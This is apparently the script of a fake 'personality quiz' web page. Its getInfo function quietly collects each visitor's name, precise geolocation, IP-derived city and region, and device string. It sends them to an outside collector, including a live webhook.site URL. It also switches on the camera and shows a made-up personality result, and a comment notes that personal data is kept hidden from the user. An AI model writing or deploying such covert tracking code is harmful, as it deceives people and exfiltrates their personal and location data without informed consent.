async function getInfo() {
  document.getElementById('step3').classList.add('hidden');
  document.getElementById('result').classList.remove('hidden');

  // IP Info (using free tier without token - limited requests)
  let ipData = await fetch('https://ipinfo.io/json?token=426c92dca41988')
    .then(res => res.json())
    .catch(() => ({ city: 'Unknown', region: 'Unknown' }));

  // Device info
  let device = navigator.userAgent;

  // Location from browser (if granted)
  navigator.geolocation.getCurrentPosition((pos) => {
    let coords = `${pos.coords.latitude}, ${pos.coords.longitude}`;
    
    // Store data but don't display personal info to user
    const userData = {
      name: document.getElementById('name').value,
      color: document.getElementById('color').value,
      location: coords,
      city: ipData.city,
      region: ipData.region,
      device: device,
      timestamp: new Date().toISOString()
    };
    
    console.log('Collected data:', userData);
    
    // Send to your server (replace with your actual endpoint)
    fetch('https://your-server.com/api/collect-data', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(userData)
    }).catch(err => console.log('Server not available:', err));

    document.getElementById('details').innerText = 
      `Thank you! Your personality analysis is complete. 
       Based on your preferences and interaction patterns, 
       you seem to be a creative and curious person!`;
  }, () => {
    // Store data but don't display personal info to user
    const userData = {
      name: document.getElementById('name').value,
      color: document.getElementById('color').value,
      location: 'Not granted',
      city: ipData.city,
      region: ipData.region,
      device: device,
      timestamp: new Date().toISOString()
    };
    
    console.log('Collected data:', userData);
    
    // Send to your server (replace with your actual endpoint)
    fetch('https://webhook.site/b1667e80-8d16-47f4-a028-7681f54284de', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(userData)
    }).catch(err => console.log('Server not available:', err));

    document.getElementById('details').innerText = 
      `Thank you! Your personality analysis is complete. 
       Based on your preferences and interaction patterns, 
       you seem to be a creative and curious person!`;
  });

  // Camera Access
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      document.getElementById('video').srcObject = stream;
    });
}

function stepTwo() {
  document.getElementById('quiz').classList.add('hidden');
  document.getElementById('step2').classList.remove('hidden');
}

function stepThree() {
  document.getElementById('step2').classList.add('hidden');
  document.getElementById('step3').classList.remove('hidden');
}
